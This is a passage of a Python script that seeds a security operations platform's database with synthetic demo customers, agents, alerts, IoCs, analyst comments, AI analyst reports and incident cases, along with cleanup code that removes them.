    for _ in range(len(tables) + 1):
        if not pending:
            return
        failed = []
        for table, column in pending:
            try:
                async with s.begin_nested():
                    await s.execute(table.delete().where(column.in_(values)))
            except IntegrityError:
                failed.append((table, column))
        if len(failed) == len(pending):
            names = ", ".join(table.name for table, _ in failed)
            raise RuntimeError(f"Cannot clear rows referencing {target_table} from: {names}")
        pending = failed


async def cleanup(s: AsyncSession) -> None:
    alert_ids = list((await s.execute(select(Alert.id).where(Alert.customer_code.in_(CODES)))).scalars())
    case_ids = list((await s.execute(select(Case.id).where(Case.customer_code.in_(CODES)))).scalars())
    template_ids = list(
        (await s.execute(select(CaseTemplate.id).where(CaseTemplate.name.in_([t["name"] for t in TEMPLATES])))).scalars(),
    )
    if case_ids:
        await _delete_referencing(s, "incident_management_case", "id", case_ids)
        await s.execute(delete(Case).where(Case.id.in_(case_ids)))
    if alert_ids:
        ioc_ids = list((await s.execute(select(AlertToIoC.ioc_id).where(AlertToIoC.alert_id.in_(alert_ids)))).scalars())
        context_ids = list((await s.execute(select(Asset.alert_context_id).where(Asset.alert_linked.in_(alert_ids)))).scalars())
        await s.execute(delete(AiAnalystIoc).where(AiAnalystIoc.alert_id.in_(alert_ids)))
        await s.execute(delete(AiAnalystReport).where(AiAnalystReport.alert_id.in_(alert_ids)))
        await s.execute(delete(AiAnalystJob).where(AiAnalystJob.alert_id.in_(alert_ids)))
        await _delete_referencing(s, "incident_management_alert", "id", alert_ids)
        await s.execute(delete(Alert).where(Alert.id.in_(alert_ids)))
        if ioc_ids:
            await s.execute(delete(IoC).where(IoC.id.in_(ioc_ids)))
        if context_ids:
            await s.execute(delete(AlertContext).where(AlertContext.id.in_(context_ids)))
    if template_ids:
        await s.execute(
            update(CaseTask)
            .where(
                CaseTask.template_task_id.in_(
                    select(CaseTemplateTask.id).where(CaseTemplateTask.template_id.in_(template_ids)),
                ),
            )
            .values(template_task_id=None),
        )
        await s.execute(delete(CaseTemplateTask).where(CaseTemplateTask.template_id.in_(template_ids)))
        await s.execute(delete(CaseTemplate).where(CaseTemplate.id.in_(template_ids)))
    tag_names = sorted({tag for rule in RULES for tag in rule["tags"]} | {"vip", "crown-jewel"})
    tag_ids = list((await s.execute(select(AlertTag.id).where(AlertTag.tag.in_(tag_names)))).scalars())
    if tag_ids:
        await _delete_referencing(s, "incident_management_alerttag", "id", tag_ids)
        await s.execute(delete(AlertTag).where(AlertTag.id.in_(tag_ids)))
    await s.execute(delete(SlaPolicy).where(SlaPolicy.customer_code.in_(CODES)))
    await s.execute(delete(SlaPolicy).where(SlaPolicy.customer_code.is_(None), SlaPolicy.updated_by == ADMIN))
    usernames = [ADMIN, PORTAL_USER, *ANALYSTS]
    user_ids = list((await s.execute(select(User.id).where(User.username.in_(usernames)))).scalars())
    if user_ids:
        await _delete_referencing(s, "user", "id", user_ids)
        await s.execute(delete(User).where(User.id.in_(user_ids)))
    await _delete_referencing(s, "customers", "customer_code", CODES)
    await s.execute(delete(Customers).where(Customers.customer_code.in_(CODES)))
    await s.commit()


def _host(rng: random.Random, code: str, kind: str) -> str:
    if kind == "user":
        return f"{rng.choice(PEOPLE[code])}@{CUSTOMERS[code]['domain']}"
    # Lower-numbered workstations show up more often: some hosts are just noisier.
    hosts = HOSTS[code][kind]
    return rng.choices(hosts, weights=list(range(len(hosts) + 1, 1, -1)))[0]


def _who(rng: random.Random, code: str) -> str:
    return rng.choice([name for name, customers in ANALYSTS.items() if code in customers])


def _history(rng: random.Random, now: datetime.datetime):
    """One alert per yielded dict, oldest first."""
    weights = [CUSTOMERS[code]["weight"] for code in CODES]
    rule_weights = [rule["weight"] for rule in RULES]
    for day in range(DAYS, 0, -1):
        # Weekdays are busier than weekends.
        weekday = (now - datetime.timedelta(days=day)).weekday()
        busy = (4, 8) if day <= 30 else (3, 7)
        for _ in range(rng.randint(*busy) if weekday < 5 else rng.randint(2, 4)):
            rule = rng.choices(RULES, weights=rule_weights)[0]
            code = rng.choices(CODES, weights=weights)[0]
            opened = now - datetime.timedelta(days=day) + datetime.timedelta(minutes=rng.randint(0, 24 * 60 - 1))
            yield {"rule": rule, "customer": code, "opened": opened}
    for minutes_ago in (14, 38, 71, 240):
        rule = rng.choices(RULES, weights=rule_weights)[0]
        yield {"rule": rule, "customer": rng.choices(CODES, weights=weights)[0], "opened": now - datetime.timedelta(minutes=minutes_ago)}


class Seeder:
    def __init__(self, s: AsyncSession, now: datetime.datetime):
        self.s = s
        self.now = now
        self.rng = random.Random(RANDOM_SEED)
        self.fakes = Fakes(self.rng)
        self.tags: dict = {}
        self.templates: dict = {}
        self.alerts: list = []  # (alert, meta)
        self.counts = {"alerts": 0, "cases": 0, "comments": 0, "iocs": 0, "agents": 0, "ai_reports": 0}

    # ---- reference data ----------------------------------------------------------------

    async def customers_and_users(self) -> None:
        s = self.s
        for code, info in CUSTOMERS.items():
            s.add(
                Customers(
                    customer_code=code,
                    customer_name=info["name"],
                    contact_first_name=info["contact"][0],
                    contact_last_name=info["contact"][1],
                    phone=f"+1 555 01{self.rng.randint(10, 99)}",
                    address_line1=f"{self.rng.randint(100, 9800)} Commerce Parkway",
                    city=info["city"],
                    state=info["state"],
                    postal_code=info["postal_code"],
                    country=info["country"],
                    customer_type=info["type"],
                    logo_file="",
                    created_at=self.now - datetime.timedelta(days=420 - 60 * CODES.index(code)),
                ),
            )
        await s.commit()
        # Provisioned: the Graylog stream, Grafana org and Wazuh group each customer got.
        for i, (code, info) in enumerate(CUSTOMERS.items()):
            s.add(
                CustomersMeta(
                    customer_code=code,
                    customer_name=info["name"],
                    customer_meta_graylog_index=f"wazuh-{code.lower()}_*",
                    customer_meta_graylog_stream=hashlib.md5(f"stream-{code}".encode()).hexdigest()[:24],
                    customer_meta_grafana_org_id=str(i + 2),
                    customer_meta_wazuh_group=code,
                    customer_meta_index_retention="30",
                    customer_meta_wazuh_registration_port=str(1515 + 10 * i),
                    customer_meta_wazuh_log_ingestion_port=str(1514 + 10 * i),
                    customer_meta_wazuh_api_port=str(55000 + i),
                    customer_meta_wazuh_auth_password=None,
                    customer_meta_iris_customer_id=None,
                    customer_meta_office365_organization_id=None,
                    customer_meta_portainer_stack_id=None,
                ),
            )
        await s.commit()

        auth = AuthHandler()
        created = self.now - datetime.timedelta(days=400)
        s.add(
            User(
                username=ADMIN,
                password=auth.get_password_hash(ADMIN_PASSWORD),
                email="soc-admin@copilot.example",
                role_id=1,
                created_at=created,
                last_login_at=self.now - datetime.timedelta(hours=1),
            ),
        )
        analyst_hash = auth.get_password_hash(ANALYST_PASSWORD)
        for i, username in enumerate(ANALYSTS):
            s.add(
                User(
                    username=username,
                    password=analyst_hash,
                    email=f"{username}@copilot.example",
                    role_id=2,
                    created_at=created + datetime.timedelta(days=30 * i),
                    last_login_at=self.now - datetime.timedelta(hours=2 + i * 5),
                ),
            )
        s.add(
            User(
                username=PORTAL_USER,
                password=auth.get_password_hash(PORTAL_PASSWORD),
                email=f"{PORTAL_USER}@{CUSTOMERS['ACME']['domain']}",
                role_id=4,
                created_at=created + datetime.timedelta(days=90),
                last_login_at=self.now - datetime.timedelta(days=1),
            ),
        )
        await s.commit()
        ids = {u.username: u.id for u in (await s.execute(select(User))).scalars()}
        for username, codes in ANALYSTS.items():
            for code in codes:
                s.add(UserCustomerAccess(user_id=ids[username], customer_code=code))
        s.add(UserCustomerAccess(user_id=ids[PORTAL_USER], customer_code="ACME"))
        self.user_ids = ids

        for row in POLICY:
            s.add(
                SlaPolicy(
                    customer_code=row.customer_code,
                    entity_type=row.entity.value,
                    severity=row.severity,
                    ack_minutes=row.ack_minutes,
                    resolve_minutes=row.resolve_minutes,
                    updated_by=ADMIN,
                    updated_at=self.now - datetime.timedelta(days=45),
                ),
            )
        await s.commit()

    async def agents(self) -> None:
        os_by_kind = {
            "workstation": [
                "Microsoft Windows 11 Enterprise 23H2",
                "Microsoft Windows 11 Pro 24H2",
                "Microsoft Windows 10 Enterprise 22H2",
            ],
            "server": ["Microsoft Windows Server 2022 Datacenter", "Microsoft Windows Server 2019 Standard"],
            "linux": ["Ubuntu 24.04 LTS", "Red Hat Enterprise Linux 9.4", "Debian GNU/Linux 12"],
            "ot": ["Microsoft Windows 10 IoT Enterprise LTSC"],
        }
        n = 0
        for code in CODES:
            for kind, hosts in HOSTS[code].items():
                for host in hosts:
                    n += 1
                    status = "active"
                    roll = self.rng.random()
                    if roll < 0.08:
                        status = "disconnected"
                    elif roll < 0.11:
                        status = "never_connected"
                    seen = self.now - (
                        datetime.timedelta(minutes=self.rng.randint(1, 9))
                        if status == "active"
                        else datetime.timedelta(days=self.rng.randint(2, 9))
                    )
                    self.s.add(
                        Agents(
                            agent_id=f"{n:03d}",
                            ip_address=f"10.{10 + CODES.index(code) * 4}.{self.rng.randint(1, 30)}.{self.rng.randint(2, 250)}",
                            os=self.rng.choice(os_by_kind[kind]),
                            hostname=host,
                            label=f"{code.lower()}-{kind}",
                            critical_asset=kind in ("server", "ot") and self.rng.random() < 0.7,
                            wazuh_last_seen=seen,
                            velociraptor_id=f"C.{hashlib.md5(host.encode()).hexdigest()[:16]}",
                            velociraptor_last_seen=seen,
                            wazuh_agent_version="v4.12.0",
                            wazuh_agent_status=status,
                            velociraptor_agent_version="0.74.3",
                            customer_code=code,
                            quarantined=False,
                            velociraptor_org="root",
                        ),
                    )
                    self.counts["agents"] += 1
        await self.s.commit()

    async def tag(self, name: str) -> AlertTag:
        if name not in self.tags:
            tag = AlertTag(tag=name)
            self.s.add(tag)
            await self.s.flush()
            self.tags[name] = tag
        return self.tags[name]

    async def case_templates(self) -> None:
        created = self.now - datetime.timedelta(days=200)
        for template in TEMPLATES:
            row = CaseTemplate(
                name=template["name"],
                description=template["description"],
                customer_code=None,
                source=None,
                is_default=False,
                created_by=ADMIN,
                created_at=created,
                updated_at=created,
            )
            self.s.add(row)
            await self.s.flush()
            tasks = []
            for i, (title, guidelines, mandatory) in enumerate(template["tasks"]):
                task = CaseTemplateTask(
                    template_id=row.id,
                    title=title,
                    description=guidelines,
                    guidelines=guidelines,
                    mandatory=mandatory,
                    order_index=i,
                )
                self.s.add(task)
                tasks.append(task)
            await self.s.flush()
            self.templates[template["name"]] = (row, tasks)
        await self.s.commit()

    # ---- alerts ------------------------------------------------------------------------

    def _fill(self, text: str, meta: dict) -> str:
        return text.format(**meta)

    async def alert(self, rule: dict, code: str, opened: datetime.datetime, *, forced: dict | None = None) -> tuple:
        """One alert with its assets, IoCs, tags, comments and SLA clock. ``forced`` pins choices."""
        rng, s, now = self.rng, self.s, self.now
        forced = forced or {}
        severity = rule["severity"]
        targets = resolve_targets(SlaEntity.ALERT, severity, code, POLICY)
        host = forced.get("host") or _host(rng, code, rule["host"])
        user = forced.get("user") or rng.choice(PEOPLE[code])
        ioc_values = [(kind, forced.get("iocs", {}).get(i) or _ioc_value(self.fakes, kind)) for i, kind in enumerate(rule["iocs"])]
        ext_ip = next((value for kind, value in ioc_values if kind == "ext_ip"), self.fakes.ext_ip())
        meta = {"host": host, "user": user, "ip": ext_ip, "customer": CUSTOMERS[code]["name"]}
        actor = forced.get("actor") or _who(rng, code)
        age = now - opened

        if "status" in forced:
            status = forced["status"]
            acked = status != "OPEN"
            ack = opened + _minutes(rng, ACK_MEDIAN[severity] * 0.6) if acked else None
            resolved = status == "CLOSED"
            resolve = (ack or opened) + _minutes(rng, RESOLVE_MEDIAN[severity]) if resolved else None
            if resolve and resolve > now:
                resolve = now - datetime.timedelta(minutes=3)
            verdict = forced.get("verdict")
            waiting = status == "PENDING_CUSTOMER"
        else:
            ack = opened + _minutes(rng, ACK_MEDIAN[severity], 0.7)
            acked = ack <= now and (age.days >= 1 or rng.random() < 0.9)
            resolve = (ack if acked else opened) + _minutes(rng, RESOLVE_MEDIAN[severity], 0.65)
            # Old or overdue work is almost always done; today's is often still open.
            overdue = targets.resolve_minutes is not None and age > datetime.timedelta(minutes=targets.resolve_minutes)
            resolved = acked and resolve <= now and rng.random() < (0.995 if age.days >= 1 or overdue else 0.55)
            verdict = None
            if resolved and rng.random() < 0.85:
                verdict = "FALSE_POSITIVE" if rng.random() < rule["fp"] else "TRUE_POSITIVE"
            waiting = acked and not resolved and rng.random() < 0.2
            if waiting:
                status = "PENDING_CUSTOMER"
            else:
                status = "CLOSED" if resolved else ("IN_PROGRESS" if acked and rng.random() < 0.65 else "OPEN")
            if not acked:
                ack = None
            if not resolved:
                resolve = None
        paused_at = min(now, ack + _minutes(rng, 90)) if waiting and ack else None
        assigned = forced.get("assigned", actor if acked and rng.random() < 0.88 else None)
        fp_reason = rng.choice(["EXPECTED_ACTIVITY", "KNOWN_APPLICATION", "AUTHORIZED_USER", "RULE_TOO_SENSITIVE"])

        alert = Alert(
            alert_name=rule["title"],
            alert_description=self._fill(rule["desc"], meta),
            status=status,
            alert_creation_time=opened,
            time_closed=resolve,
            customer_code=code,
            source=rule["source"],
            severity=severity,
            assigned_to=assigned,
            escalated=severity == "Critical" and status != "CLOSED",
            verdict=verdict,
            verdict_reason=fp_reason if verdict == "FALSE_POSITIVE" else None,
            verdict_by=actor if verdict else None,
            verdict_at=resolve if verdict else None,
        )
        s.add(alert)
        await s.flush()

        # Context and assets: the main host, sometimes a second one involved.
        context = AlertContext(
            source=rule["source"],
            context={
                "rule_description": rule["title"],
                "customer_code": code,
                "agent_name": host,
                "user": user,
                "src_ip": ext_ip,
                "mitre_technique": rule["tags"][0],
                "event_time": opened.isoformat() + "Z",
            },
        )
        s.add(context)
        await s.flush()
        index = f"{'wazuh-alerts-4.x' if rule['source'] in ('wazuh', 'sigma') else rule['source']}-{code.lower()}-{opened:%Y.%m.%d}"
        assets = [host]
        if rule["host"] in ("workstation", "server") and rng.random() < 0.25:
            other = _host(rng, code, "server")
            if other != host:
                assets.append(other)
        for name in forced.get("assets", assets):
            agent_n = sum(len(h) for c in CODES[: CODES.index(code)] for h in HOSTS[c].values())
            s.add(
                Asset(
                    alert_linked=alert.id,
                    asset_name=name,
                    alert_context_id=context.id,
                    agent_id=f"{agent_n + rng.randint(1, 15):03d}" if "@" not in name else None,
                    velociraptor_id=f"C.{hashlib.md5(name.encode()).hexdigest()[:16]}" if "@" not in name else None,
                    customer_code=code,
                    index_name=index,
                    index_id=self.fakes.doc_id(),
                ),
            )

        for kind, value in ioc_values:
            ioc_type, description = IOC_DESCRIPTIONS[kind]
            ioc = IoC(value=value, type=ioc_type, description=description)
            s.add(ioc)
            await s.flush()
            s.add(AlertToIoC(alert_id=alert.id, ioc_id=ioc.id))
            self.counts["iocs"] += 1

        tags = list(forced.get("tags", rule["tags"]))
        if "tags" not in forced and code in ("NWH", "INIT") and rule["host"] == "server" and rng.random() < 0.4:
            tags.append("crown-jewel")
        for name in tags:
            s.add(AlertToTag(alert_id=alert.id, tag_id=(await self.tag(name)).id))

        # Comments: analysts write when they act. FP closures say why.
        comments = forced.get("comments")
        if comments is None:
            comments = []
            if acked and rng.random() < 0.55:
                notes = rule["notes"]
                note = notes[-1] if verdict == "TRUE_POSITIVE" and len(notes) > 1 else notes[0]
                if verdict == "FALSE_POSITIVE" and len(notes) > 1:
                    note = (
                        notes[1]
                        if "false positive" in notes[1].lower() or "expected" in notes[1].lower() or "benign" in notes[1].lower()
                        else notes[0]
                    )
                comments.append((actor, self._fill(note, meta), (ack or opened) + _minutes(rng, 12)))
            if waiting:
                comments.append((actor, f"Asked {CUSTOMERS[code]['contact'][0]} to confirm whether this activity was expected.", paused_at))
        for author, text, at in comments:
            s.add(Comment(alert_id=alert.id, comment=text, user_name=author, created_at=min(at, now)))
            self.counts["comments"] += 1

        s.add(
            AlertSlaTracking(
                alert_id=alert.id,
                severity=severity,
                opened_at=opened,
                ack_due_at=targets.ack_due(opened),
                resolve_due_at=targets.resolve_due(opened),
                first_ack_at=ack,
                first_ack_by=actor if ack else None,
                first_ack_action=rng.choice(["assigned", "status_changed", "commented"]) if ack else None,
                first_assigned_at=ack if assigned and ack else None,
                resolved_at=resolve,
                resolved_by=actor if resolve else None,
                first_resolved_at=resolve,
                reopen_count=1 if resolve and rng.random() < 0.03 else 0,
                paused_at=paused_at,
                tracked=True,
                updated_at=now,
            ),
        )
        self.counts["alerts"] += 1
        record = {
            "alert": alert,
            "rule": rule,
            "code": code,
            "actor": actor,
            "ack": ack,
            "resolve": resolve,
            "verdict": verdict,
            "host": host,
            "user": user,
            "meta": meta,
        }
        self.alerts.append(record)
        return alert, record

    async def history(self) -> None:
        for item in _history(self.rng, self.now):
            await self.alert(item["rule"], item["customer"], item["opened"])
        await self.s.commit()

    async def heroes(self) -> dict:
        """The alerts the README opens: ACME's credential theft chain and two more with AI reports."""
        now = self.now
        hero_assets = ["ACME-WS-0142", "ACME-DC-01"]
        macro, _ = await self.alert(
            RULE_BY_TITLE["Office macro spawned cmd.exe"],
            "ACME",
            now - datetime.timedelta(minutes=118),
            forced={
                "host": "ACME-WS-0142",
                "user": "l.brandt",
                "status": "IN_PROGRESS",
                "actor": "maria.lopez",
                "assigned": "maria.lopez",
                "comments": [
                    (
                        "maria.lopez",
                        "Part of the same chain as the mimikatz detection on this host. Linked to the case.",
                        now - datetime.timedelta(minutes=70),
                    ),
                ],
            },
        )
        powershell, _ = await self.alert(
            RULE_BY_TITLE["Suspicious PowerShell encoded command"],
            "ACME",
            now - datetime.timedelta(minutes=116),
            forced={
                "host": "ACME-WS-0142",
                "user": "l.brandt",
                "status": "IN_PROGRESS",
                "actor": "maria.lopez",
                "assigned": "maria.lopez",
                "iocs": {1: "cdn-sync-edge41.example"},
                "comments": [],
            },
        )
        # A second ACME alert, the one the portal user is asked about.
        travel, _ = await self.alert(
            RULE_BY_TITLE["Impossible travel sign-in"],
            "ACME",
            now - datetime.timedelta(hours=7),
            forced={
                "user": "m.chen",
                "host": f"m.chen@{CUSTOMERS['ACME']['domain']}",
                "status": "PENDING_CUSTOMER",
                "actor": "tobias.weber",
                "assigned": "tobias.weber",
                "iocs": {0: "203.0.113.19", 1: "198.51.100.23"},
                "comments": [
                    (
                        "tobias.weber",
                        "Sessions revoked. Waiting on Acme IT to confirm with m.chen whether the new authenticator was theirs.",
                        now - datetime.timedelta(hours=6),
                    ),
                ],
            },
        )
        nwh_ps, _ = await self.alert(
            RULE_BY_TITLE["Suspicious PowerShell encoded command"],
            "NWH",
            now - datetime.timedelta(hours=3, minutes=20),
            forced={
                "host": "NWH-WS-2231",
                "user": "a.patel",
                "status": "IN_PROGRESS",
                "actor": "dsingh",
                "assigned": "dsingh",
                "iocs": {1: "telemetry-relay-hub7.example"},
                "comments": [
                    ("dsingh", "Loader confirmed. Host isolated, collecting memory.", now - datetime.timedelta(hours=2, minutes=50)),
                ],
            },
        )
        phish, _ = await self.alert(
            RULE_BY_TITLE["Phishing link clicked"],
            "ACME",
            now - datetime.timedelta(hours=2, minutes=50),
            forced={
                "user": "s.novak",
                "host": f"s.novak@{CUSTOMERS['ACME']['domain']}",
                "status": "IN_PROGRESS",
                "actor": "jkim",
                "assigned": "jkim",
                "comments": [
                    (
                        "jkim",
                        "Same lure as the invoice macro on ACME-WS-0142. Opened a case to scope the campaign.",
                        now - datetime.timedelta(hours=2, minutes=35),
                    ),
                ],
            },
        )
        # Fresh, untouched work: one alert close to its response target, one quiet one.
        risk, _ = await self.alert(
            RULE_BY_TITLE["Kerberoasting: RC4 service ticket requests"],
            "ACME",
            now - datetime.timedelta(minutes=48),
            forced={"host": "ACME-DC-02", "user": "svc_sqlreport", "status": "OPEN", "assigned": None, "comments": []},
        )
        scan, _ = await self.alert(
            RULE_BY_TITLE["Port scan from external host"],
            "ACME",
            now - datetime.timedelta(minutes=21),
            forced={"host": "acme-web-01", "status": "OPEN", "assigned": None, "comments": []},
        )
        # Two more clocks running out elsewhere, so the attention lists have work in them.
        await self.alert(
            RULE_BY_TITLE["Impossible travel sign-in"],
            "NWH",
            now - datetime.timedelta(minutes=24),
            forced={
                "user": "h.nguyen",
                "host": f"h.nguyen@{CUSTOMERS['NWH']['domain']}",
                "status": "OPEN",
                "assigned": None,
                "comments": [],
            },
        )
        await self.alert(
            RULE_BY_TITLE["Web shell upload attempt blocked"],
            "GLBX",
            now - datetime.timedelta(hours=19, minutes=40),
            forced={
                "host": "glbx-checkout-api01",
                "status": "IN_PROGRESS",
                "actor": "dsingh",
                "assigned": "dsingh",
                "comments": [
                    (
                        "dsingh",
                        "Blocked at the WAF. Checking the upload directory on the node for anything that got through.",
                        now - datetime.timedelta(hours=18),
                    ),
                ],
            },
        )
        hero, _ = await self.alert(
            RULE_BY_TITLE["Mimikatz credential dumping"],
            "ACME",
            now - datetime.timedelta(minutes=104),
            forced={
                "host": "ACME-WS-0142",
                "user": "l.brandt",
                "assets": hero_assets,
                "status": "IN_PROGRESS",
                "actor": "maria.lopez",
                "assigned": "maria.lopez",
                "tags": ["T1003.001", "credential-access", "edr", "vip"],
                "iocs": {0: hashlib.sha256(b"svchost64.exe").hexdigest(), 1: "10.12.4.142"},
                "comments": [
                    (
                        "maria.lopez",
                        "Host network-contained in Falcon. Pulling a memory image with Velociraptor before remediation.",
                        now - datetime.timedelta(minutes=96),
                    ),
                    (
                        "jkim",
                        f"Same user opened Invoice_Q3_2026.docm at {macro.alert_creation_time:%H:%M} UTC. Macro and PowerShell alerts linked to the case.",
                        now - datetime.timedelta(minutes=80),
                    ),
                    (
                        "maria.lopez",
                        "AI Analyst report agrees: initial access via macro, LSASS dumped. Resetting l.brandt and the 3 cached accounts now.",
                        now - datetime.timedelta(minutes=41),
                    ),
                ],
            },
        )
        await self.s.commit()
        return {
            "hero": hero,
            "macro": macro,
            "powershell": powershell,
            "travel": travel,
            "nwh_ps": nwh_ps,
            "phish": phish,
            "risk": risk,
            "scan": scan,
        }

    async def ai_reports(self, heroes: dict) -> None:
        targets = {"hero": heroes["hero"], "travel": heroes["travel"], "powershell": heroes["nwh_ps"]}
        for n, spec in enumerate(AI_REPORTS):
            alert = targets[spec["key"]]
            created = alert.alert_creation_time + datetime.timedelta(minutes=9)
            job_id = f"job-{alert.customer_code.lower()}-{alert.id}-{n}"
            self.s.add(
                AiAnalystJob(
                    id=job_id,
                    alert_id=alert.id,
                    customer_code=alert.customer_code,
                    status="completed",
                    alert_type=spec["template"],
                    triggered_by="webhook",
                    template_used=spec["template"],
                    created_at=created,
                    started_at=created + datetime.timedelta(seconds=4),
                    completed_at=created + datetime.timedelta(minutes=3, seconds=12),
                ),
            )
            await self.s.flush()
            markdown = spec["markdown"]
            if spec["key"] == "hero":
                # The timeline names the chain's real times: macro 14 min before the dump.
                t = alert.alert_creation_time
                steps = (-14, -13, -12, -1, 0)
                for i, minutes in enumerate(steps):
                    markdown = markdown.replace(f"{{t{i}}}", f"{t + datetime.timedelta(minutes=minutes):%H:%M}")
            report = AiAnalystReport(
                job_id=job_id,
                alert_id=alert.id,
                customer_code=alert.customer_code,
                severity_assessment=spec["severity"],
                report_markdown=markdown,
                summary=spec["summary"],
                recommended_actions=spec["actions"],
                created_at=created + datetime.timedelta(minutes=3, seconds=12),
            )
            self.s.add(report)
            await self.s.flush()
            for value, kind, verdict, score, details in spec["iocs"]:
                self.s.add(
                    AiAnalystIoc(
                        report_id=report.id,
                        alert_id=alert.id,
                        customer_code=alert.customer_code,
                        ioc_value=value,
                        ioc_type=kind,
                        vt_verdict=verdict,
                        vt_score=score,
                        details=details,
                        created_at=report.created_at,
                    ),
                )
            self.counts["ai_reports"] += 1
        await self.s.commit()

    # ---- cases -------------------------------------------------------------------------

    def _event(self, case_id: int, kind: str, actor: str, at: datetime.datetime, payload: dict) -> None:
        self.s.add(CaseEvent(case_id=case_id, event_type=kind, actor=actor, timestamp=min(at, self.now), payload=payload))

    async def case(
        self,
        name: str,
        records: list,
        status: str,
        created: datetime.datetime,
        owner: str,
        *,
        description: str,
        notes: list,
        closed: datetime.datetime | None = None,
        task_progress: float = 0.5,
    ) -> Case:
        s, now, rng = self.s, self.now, self.rng
        first = records[0]
        code = first["code"]
        severities = ["Informational", "Low", "Medium", "High", "Critical"]
        severity = max((r["alert"].severity for r in records), key=severities.index)
        case = Case(
            case_name=name,
            case_description=description,
            case_creation_time=created,
            case_status=status,
            case_closed_time=closed,
            assigned_to=owner,
            customer_code=code,
            escalated=severity == "Critical" and status != "CLOSED",
        )
        s.add(case)
        await s.flush()
        self._event(case.id, "case_created", owner, created, {"source": "from_alert", "alert_id": first["alert"].id, "template_id": None})
        for i, record in enumerate(records):
            s.add(CaseAlertLink(case_id=case.id, alert_id=record["alert"].id))
            self._event(case.id, "alert_linked", owner, created + datetime.timedelta(minutes=i), {"alert_id": record["alert"].id})
        self._event(case.id, "case_assigned", owner, created + datetime.timedelta(minutes=2), {"from": None, "to": owner})

        template_name = TEMPLATE_FOR_RULE.get(first["rule"]["title"])
        if template_name:
            template, template_tasks = self.templates[template_name]
            applied = created + datetime.timedelta(minutes=3)
            self._event(
                case.id,
                "template_applied",
                owner,
                applied,
                {
                    "template_id": template.id,
                    "template_name": template.name,
                    "tasks_added": len(template_tasks),
                    "alert_id": first["alert"].id,
                },
            )
            done_count = len(template_tasks) if status == "CLOSED" else int(round(len(template_tasks) * task_progress))
            for i, ttask in enumerate(template_tasks):
                done = i < done_count
                completed_at = applied + datetime.timedelta(minutes=25 * (i + 1)) if done else None
                if completed_at and completed_at > now:
                    completed_at = now - datetime.timedelta(minutes=max(1, 5 * (done_count - i)))
                task = CaseTask(
                    case_id=case.id,
                    alert_id=first["alert"].id,
                    template_task_id=ttask.id,
                    title=ttask.title,
                    description=ttask.description,
                    guidelines=ttask.guidelines,
                    mandatory=ttask.mandatory,
                    order_index=ttask.order_index,
                    status="DONE" if done else "TODO",
                    evidence_comment=TASK_EVIDENCE.get(ttask.title) if done else None,
                    completed_by=owner if done else None,
                    completed_at=completed_at,
                    assigned_to=owner if i % 2 == 0 else rng.choice([a for a, c in ANALYSTS.items() if code in c]),
                    created_by=owner,
                    created_at=applied,
                    updated_at=completed_at or applied,
                )
                s.add(task)
                await s.flush()
                self._event(
                    case.id,
                    "task_added",
                    owner,
                    applied,
                    {
                        "task_id": task.id,
                        "title": task.title,
                        "mandatory": task.mandatory,
                        "source": "template",
                        "template_id": template.id,
                        "alert_id": first["alert"].id,
                    },
                )
                if done:
                    self._event(
                        case.id,
                        "task_status_changed",
                        owner,
                        completed_at,
                        {"task_id": task.id, "title": task.title, "mandatory": task.mandatory, "from_status": "TODO", "to_status": "DONE"},
                    )

        for i, (author, text) in enumerate(notes):
            at = created + datetime.timedelta(minutes=20 + 35 * i)
            if closed:
                at = min(at, closed - datetime.timedelta(minutes=5))
            at = min(at, now - datetime.timedelta(minutes=2))
            comment = CaseComment(case_id=case.id, comment=text, user_name=author, created_at=at)
            s.add(comment)
            await s.flush()
            self._event(case.id, "comment_added", author, at, {"comment_id": comment.id, "snippet": text[:140]})
        if status != "OPEN":
            self._event(
                case.id,
                "case_status_changed",
                owner,
                created + datetime.timedelta(minutes=5),
                {"from": "OPEN", "to": "IN_PROGRESS", "forced": False},
            )
        if status in ("PENDING_CUSTOMER", "CLOSED"):
            at = closed or (created + datetime.timedelta(hours=3))
            self._event(case.id, "case_status_changed", owner, at, {"from": "IN_PROGRESS", "to": status, "forced": False})

        targets = resolve_targets(SlaEntity.CASE, severity, code, POLICY)
        s.add(
            CaseSlaTracking(
                case_id=case.id,
                severity=severity,
                opened_at=created,
                ack_due_at=targets.ack_due(created),
                resolve_due_at=targets.resolve_due(created),
                first_ack_at=created,
                first_ack_by=owner,
                first_ack_action="created",
                first_assigned_at=created,
                resolved_at=closed,
                resolved_by=owner if closed else None,
                first_resolved_at=closed,
                paused_at=(created + datetime.timedelta(hours=3)) if status == "PENDING_CUSTOMER" else None,
                tracked=True,
                updated_at=now,
            ),
        )
        self.counts["cases"] += 1
        return case

    async def cases(self, heroes: dict) -> dict:
        now, rng = self.now, self.rng
        by_id = {record["alert"].id: record for record in self.alerts}
        hero_ids = {a.id for a in heroes.values()}

        # Cases from the history first (lower ids): true positives of the serious rules.
        candidates = [
            r
            for r in self.alerts
            if r["alert"].severity in ("Critical", "High")
            and r["verdict"] != "FALSE_POSITIVE"
            and r["alert"].id not in hero_ids
            and r["ack"] is not None
            and now - r["alert"].alert_creation_time < datetime.timedelta(days=55)
        ]
        candidates.sort(key=lambda r: r["alert"].alert_creation_time)
        step = max(1, len(candidates) // 16)
        used: set = set()
        for record in candidates[::step][:16]:
            if record["alert"].id in used:
                continue
            group = [record]
            for other in self.alerts:
                if (
                    other is not record
                    and other["code"] == record["code"]
                    and other["rule"]["title"] == record["rule"]["title"]
                    and other["alert"].id not in used
                    and abs((other["alert"].alert_creation_time - record["alert"].alert_creation_time).total_seconds()) < 3 * 86400
                    and other["alert"].id not in hero_ids
                    and len(group) < 3
                ):
                    group.append(other)
            used.update(r["alert"].id for r in group)
            created = record["ack"] + datetime.timedelta(minutes=rng.randint(3, 30))
            age = now - created
            status = "CLOSED" if age.days >= 4 else rng.choice(["IN_PROGRESS", "IN_PROGRESS", "PENDING_CUSTOMER"])
            took = {"Critical": 360, "High": 960}[record["alert"].severity]
            closed = created + _minutes(rng, took, 0.6) if status == "CLOSED" else None
            if closed and closed > now:
                status, closed = "IN_PROGRESS", None
            meta = record["meta"]
            name = record["rule"]["case"].format(**meta)
            notes = [(record["actor"], record["rule"]["notes"][-1].format(**meta))]
            if status == "CLOSED":
                notes.append(
                    (record["actor"], "Remediation verified with the customer. Closing the case; lessons learned added to the playbook."),
                )
            await self.case(
                name,
                group,
                status,
                created,
                record["actor"],
                description=f"Opened from alert #{record['alert'].id}: {record['alert'].alert_description}",
                notes=notes,
                closed=closed,
                task_progress=rng.choice([0.2, 0.4, 0.6, 0.8]),
            )

